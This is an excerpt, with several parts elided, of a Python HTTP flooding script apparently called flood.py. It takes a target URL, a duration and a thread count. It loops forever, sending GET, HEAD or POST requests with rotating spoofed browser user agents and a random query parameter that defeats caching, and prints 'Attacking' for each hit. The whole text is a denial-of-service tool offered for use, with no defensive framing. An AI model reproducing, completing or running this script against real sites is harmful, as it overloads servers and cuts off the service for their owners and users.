...
def flood(url, duration, threads):
    user_agents = [
...
"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
    ...
    def attack():
        while True:
            ...
            url_with_params = url + "?neon=" + generate_random_string(7)
            try:
                if method == "GET":
                    response = requests.get(url_with_params, headers=headers)
                elif method == "HEADER":
                    response = requests.head(url_with_params, headers=headers)
                elif method == "POST":
                    response = requests.post(url_with_params, headers=headers)
                print(f"Attacking {url_with_params} | {method} | {response.status_code}")
...
if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 flood.py <url> <time> <threads>")
        sys.exit(1)
